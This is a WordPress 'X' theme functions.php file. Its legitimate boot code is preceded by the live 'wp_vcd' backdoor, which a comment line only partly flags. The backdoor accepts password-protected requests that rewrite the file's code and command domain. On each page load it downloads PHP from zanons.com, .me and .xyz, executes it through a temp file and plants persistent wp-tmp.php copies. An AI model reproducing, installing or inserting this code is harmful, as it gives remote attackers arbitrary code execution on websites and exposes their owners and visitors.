<!-- NOTES FROM MIKE -->
<!-- Known malicious javascript malware. Details: http://labs.sucuri.net/db/malware/rogueads.unwanted_ads?1 -->
<!-- <script type="text/javascript" src="//go.oclasrv.com/apu.php?zoneid=1527634"></script> */ -->

<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b454e980243f02b46aff0fd6eb7988a0'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='08b370e35d008b6591dd40b0eec23025';
        if (($tmpcontent = @file_get_contents("http://www.zanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.zanons.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

// =============================================================================
// FUNCTIONS.PHP
// -----------------------------------------------------------------------------
// Theme functions for X.
// =============================================================================

// =============================================================================
// TABLE OF CONTENTS
// -----------------------------------------------------------------------------
//   01. Define Path / URL Constants
//   02. Set Paths
//   03. Preboot
//   04. Set Asset Revision Constant
//   05. Require Files
// =============================================================================

function x_boot() {

  // Define Path / URL Constants
  // ---------------------------

  define( 'X_TEMPLATE_PATH', get_template_directory() );
  define( 'X_TEMPLATE_URL', get_template_directory_uri() );


  // Set Paths
  // ---------

  $load_path = X_TEMPLATE_PATH . '/framework/load';
  $func_path = X_TEMPLATE_PATH . '/framework/functions';
  $glob_path = X_TEMPLATE_PATH . '/framework/functions/global';
  $admn_path = X_TEMPLATE_PATH . '/framework/functions/global/admin';
  $lgcy_path = X_TEMPLATE_PATH . '/framework/legacy';
  $eque_path = X_TEMPLATE_PATH . '/framework/functions/global/enqueue';
  $plgn_path = X_TEMPLATE_PATH . '/framework/functions/global/plugins';


  // Preboot
  // -------

  $x_boot_files = glob( "$load_path/*.php" );

  sort( $x_boot_files );

  foreach ( $x_boot_files as $filename ) {
    $file = basename( $filename, '.php' );
    if ( file_exists( $filename ) && apply_filters( "x_pre_boot_$file", '__return_true' ) ) {
      require_once( $filename );
    }
  }


  // Set Asset Revision Constant (For Cache Busting)
  // -----------------------------------------------

  define( 'X_ASSET_REV', X_VERSION );


  // Require Files
  // -------------

  $require_files = apply_filters( 'x_boot_files', array(

    $glob_path . '/debug.php',
    $glob_path . '/conditionals.php',
    $glob_path . '/helpers.php',
    $glob_path . '/stack-data.php',
    $glob_path . '/tco-setup.php',

    $admn_path . '/thumbnails/setup.php',
    $admn_path . '/setup.php',
    $admn_path . '/meta/setup.php',
    $admn_path . '/sidebars.php',
    $admn_path . '/widgets.php',
    $admn_path . '/custom-post-types.php',
    $admn_path . '/cs-options/setup.php',
    $admn_path . '/menus/setup.php',
    $admn_path . '/customizer/setup.php',
    $admn_path . '/addons/setup.php',

    $lgcy_path . '/setup.php',

    $eque_path . '/styles.php',
    $eque_path . '/scripts.php',

    $glob_path . '/view-routing.php',
    $glob_path . '/action-defer.php',
    $glob_path . '/meta.php',
    $glob_path . '/featured.php',
    $glob_path . '/pagination.php',
    $glob_path . '/breadcrumbs.php',
    $glob_path . '/classes.php',
    $glob_path . '/portfolio.php',
    $glob_path . '/social.php',
    $glob_path . '/content.php',
    $glob_path . '/remove.php',

    $func_path . '/integrity.php',
    $func_path . '/renew.php',
    $func_path . '/icon.php',
    $func_path . '/ethos.php',

    $plgn_path . '/setup.php'

  ));

  foreach ( $require_files as $filename ) {
    if ( file_exists( $filename ) ) {
      require_once( $filename );
    }
  }

}

x_boot();

